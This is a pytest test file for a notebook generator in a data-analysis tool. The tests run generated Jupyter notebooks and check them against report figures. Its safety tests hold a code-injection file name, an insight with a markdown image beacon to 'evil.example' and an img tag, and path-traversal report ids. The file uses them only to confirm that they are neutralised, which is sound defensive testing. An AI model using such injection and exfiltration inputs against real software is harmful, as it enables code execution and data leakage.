"""Tests for backend/tools/notebook_generator.py. The execution tests really run each notebook in a Jupyter kernel."""
import ast
import shutil
from pathlib import Path
from typing import Optional

import nbformat
import pandas as pd
import pytest

import backend.tools.notebook_generator as notebook_generator
from backend.tools.correlation_analyzer import analyze_correlations
from backend.tools.missing_value_analyzer import analyze_missing_values
from backend.tools.notebook_generator import generate_notebook
from backend.tools.outlier_analyzer import analyze_outliers
from backend.utils.file_handler import LoadedFile, load_file
from tests.test_planner import AWKWARD_INPUTS

SAMPLE_DIR = Path(__file__).parent / "sample_data"
SAMPLES = [
    ("shop_orders.csv", "returned"),
    ("hospital.xlsx", "readmitted"),
    ("semicolon_separated.csv", None),
    ("latin1_encoded.csv", None),
    ("survey_with_gaps.csv", None),
    ("weather_ddmm.csv", None),
]


@pytest.fixture(autouse=True)
def reports_in_tmp(tmp_path, monkeypatch):
    monkeypatch.setattr(notebook_generator, "REPORTS_DIR", str(tmp_path))
    return tmp_path


def build(name: str, target: Optional[str] = None, insights=None, report_id: str = "r1"):
    loaded = load_file((SAMPLE_DIR / name).read_bytes(), name)
    df = loaded.df
    results = (analyze_missing_values(df), analyze_correlations(df, target), analyze_outliers(df, target))
    payloads = {r.tool_name: r.payload for r in results if r.success}
    return generate_notebook(loaded, name, report_id, payloads, insights=insights)


def read(reports: Path, report_id: str = "r1"):
    return nbformat.read(reports / report_id / "notebook.ipynb", as_version=4)


def cell_output(cell) -> str:
    parts = []
    for output in cell.get("outputs", []):
        if output.get("output_type") == "stream":
            parts.append(output["text"])
        elif "text/plain" in output.get("data", {}):
            parts.append(output["data"]["text/plain"])
    return "".join(parts)


# --- running the notebook like a user would ---

@pytest.mark.parametrize("name, target", SAMPLES, ids=[s[0] for s in SAMPLES])
def test_notebook_runs_and_reproduces_the_reports_numbers(name, target, reports_in_tmp):
    nbclient = pytest.importorskip("nbclient", reason="install requirements-dev.txt to run notebooks")
    result = build(name, target)
    assert result.success, result.error

    folder = reports_in_tmp / "r1"
    shutil.copy(SAMPLE_DIR / name, folder / name)  # the user puts the file next to the notebook
    notebook = read(reports_in_tmp)
    nbclient.NotebookClient(notebook, timeout=120, kernel_name="python3", resources={"metadata": {"path": str(folder)}}).execute()

    for check in result.payload["checks"]:
        printed = cell_output(notebook.cells[check["cell"]])
        for expected in check["expect"]:
            assert expected in printed, f"{check['finding']}: expected '{expected}'"


def test_notebook_repeats_placeholders_read_as_missing(reports_in_tmp):
    nbclient = pytest.importorskip("nbclient", reason="install requirements-dev.txt to run notebooks")
    # The user's file has "?" in every 20th delivery_days cell (15 of 300)
    raw = pd.read_csv(SAMPLE_DIR / "shop_orders.csv")
    raw["delivery_days"] = raw["delivery_days"].astype(object)
    raw.loc[raw.index[::20], "delivery_days"] = "?"
    folder = reports_in_tmp / "r1"
    folder.mkdir()
    raw.to_csv(folder / "orders_q.csv", index=False)

    loaded = load_file((folder / "orders_q.csv").read_bytes(), "orders_q.csv")
    results = (analyze_missing_values(loaded.df), analyze_correlations(loaded.df, "returned"), analyze_outliers(loaded.df, "returned"))
    result = generate_notebook(loaded, "orders_q.csv", "r1", {r.tool_name: r.payload for r in results if r.success})
    notebook = read(reports_in_tmp)
    assert "df['delivery_days'] = pd.to_numeric(df['delivery_days'].replace(['?'], np.nan))" in notebook.cells[2].source

    nbclient.NotebookClient(notebook, timeout=120, kernel_name="python3", resources={"metadata": {"path": str(folder)}}).execute()
    checks = {c["finding"]: c["expect"] for c in result.payload["checks"]}
    assert checks["delivery_days & rating"] == ["Pearson -0.7180", "Spearman -0.7158"]
    for check in result.payload["checks"]:
        for expected in check["expect"]:
            assert expected in cell_output(notebook.cells[check["cell"]]), f"{check['finding']}: expected '{expected}'"


def test_notebook_repeats_units_removed_and_converted(reports_in_tmp):
    nbclient = pytest.importorskip("nbclient", reason="install requirements-dev.txt to run notebooks")
    # The user's export writes money with "$", days with a unit, and every 3rd temperature in Fahrenheit
    raw = pd.read_csv(SAMPLE_DIR / "shop_orders.csv")
    raw["order_value"] = "$" + raw["order_value"].map("{:,.2f}".format)
    raw["delivery_days"] = raw["delivery_days"].astype(str) + " days"
    fahrenheit = raw.index % 3 == 0
    raw["outdoor_temp_c"] = [f"{t * 9 / 5 + 32:.1f}F" if f else f"{t}C" for t, f in zip(raw["outdoor_temp_c"], fahrenheit)]
    folder = reports_in_tmp / "r1"
    folder.mkdir()
    raw.to_csv(folder / "orders_units.csv", index=False)

    loaded = load_file((folder / "orders_units.csv").read_bytes(), "orders_units.csv")
    assert loaded.resolve_units("outdoor_temp_c", {"C": "degC", "F": "degF"}) is None  # the planner's answer
    results = (analyze_missing_values(loaded.df), analyze_correlations(loaded.df, "returned"), analyze_outliers(loaded.df, "returned"))
    result = generate_notebook(loaded, "orders_units.csv", "r1", {r.tool_name: r.payload for r in results if r.success})
    notebook = read(reports_in_tmp)
    assert "UNIT_NUMBER = " in notebook.cells[2].source

    nbclient.NotebookClient(notebook, timeout=120, kernel_name="python3", resources={"metadata": {"path": str(folder)}}).execute()
    checks = {c["finding"]: c["expect"] for c in result.payload["checks"]}
    assert checks["delivery_days & rating"] == ["Pearson -0.7206", "Spearman -0.7175"]  # same as the clean file
    for check in result.payload["checks"]:
        for expected in check["expect"]:
            assert expected in cell_output(notebook.cells[check["cell"]]), f"{check['finding']}: expected '{expected}'"


# --- what the notebook contains ---

def test_findings_are_checked_with_report_numbers():
    result = build("shop_orders.csv", "returned")
    checks = {c["finding"]: c["expect"] for c in result.payload["checks"]}
    assert result.payload["findings_checked"] == 16
    assert checks["file loads with the same shape"] == ["(300, 18)"]
    assert checks["delivery_days & rating"] == ["Pearson -0.7206", "Spearman -0.7175"]
    assert checks["outliers in basket_items"] == ["normal range -4.0000 to 12.0000; 1 outside"]


def test_file_is_read_with_the_detected_settings(reports_in_tmp):
    build("semicolon_separated.csv", report_id="semi")
    build("latin1_encoded.csv", report_id="latin")
    build("hospital.xlsx", report_id="excel")
    assert "pd.read_csv(FILE, sep=';', encoding='utf-8-sig')" in read(reports_in_tmp, "semi").cells[2].source
    # The loader's encoding guess for this file; the notebook repeats whatever the loader used
    assert "encoding='windows-1252'" in read(reports_in_tmp, "latin").cells[2].source
    assert "pd.read_excel(FILE, sheet_name='admissions')" in read(reports_in_tmp, "excel").cells[2].source


def test_summary_for_the_llm_has_no_server_path():
    result = build("shop_orders.csv", "returned")
    assert result.summary == "Notebook (notebook.ipynb): loads the file as DS Copilot did and re-checks 16 finding(s) with short pandas code"


def test_duplicate_column_names_are_read_by_position(reports_in_tmp):
    x = [float(v * 3 % 7) for v in range(60)]
    df = pd.DataFrame({"x": x, "y": [2 * value + v % 3 for v, value in enumerate(x)]})  # related, not a sequence
    df.columns = ["a", "a"]
    loaded = LoadedFile(df=df, file_type="csv", original_columns=["a", "a"], encoding="utf-8", delimiter=",")
    payloads = {"correlation_analyzer": analyze_correlations(df).payload}
    generate_notebook(loaded, "dup.csv", "dup", payloads)
    sources = "".join(c.source for c in read(reports_in_tmp, "dup").cells if c.cell_type == "code")
    assert "df.iloc[:, 0]" in sources and "df.iloc[:, 1]" in sources


# --- safety ---

def test_file_name_cannot_inject_code(reports_in_tmp):
    df = AWKWARD_INPUTS["one_row"]()
    loaded = LoadedFile(df=df, file_type="csv", original_columns=list(df.columns), encoding="utf-8", delimiter=",")
    generate_notebook(loaded, "a.csv'); print('INJECTED'); x=('", "inj", {})
    tree = ast.parse(read(reports_in_tmp, "inj").cells[2].source)
    calls = [n for n in ast.walk(tree) if isinstance(n, ast.Call) and any(isinstance(a, ast.Constant) and a.value == "INJECTED" for a in n.args)]
    assert isinstance(tree.body[0].value, ast.Constant) and calls == []


def test_insights_are_plain_text_and_never_code(reports_in_tmp):
    insight = "North is highest ![x](https://evil.example/t?d=north) see [docs](https://evil.example) <img src=x>"
    build("shop_orders.csv", insights=[insight])
    notebook = read(reports_in_tmp)
    assert notebook.cells[-1].source == "## Insights\n\n- North is highest  see docs"
    assert not any("evil.example" in c.source for c in notebook.cells)


def test_unicode_text_is_saved(reports_in_tmp):
    result = build("shop_orders.csv", insights=["Tokyo 東京 orders are highest"])
    assert result.success
    assert "東京" in read(reports_in_tmp).cells[-1].source


@pytest.mark.parametrize("report_id", ["../escape", "a/b", "", "x" * 65])
def test_report_id_cannot_leave_the_reports_folder(report_id):
    result = build("shop_orders.csv", report_id=report_id)
    assert (result.success, result.error) == (False, "report_id may only contain letters, digits, '-' and '_'")


@pytest.mark.parametrize("make_df", AWKWARD_INPUTS.values(), ids=AWKWARD_INPUTS.keys())
def test_awkward_inputs_produce_a_valid_notebook(make_df):
    df = make_df()
    df.columns = [str(c) for c in df.columns]
    loaded = LoadedFile(df=df, file_type="csv", original_columns=list(df.columns), encoding="utf-8", delimiter=",")
    results = (analyze_missing_values(df), analyze_correlations(df), analyze_outliers(df))
    result = generate_notebook(loaded, "data.csv", "awk", {r.tool_name: r.payload for r in results if r.success})
    assert result.success, result.error
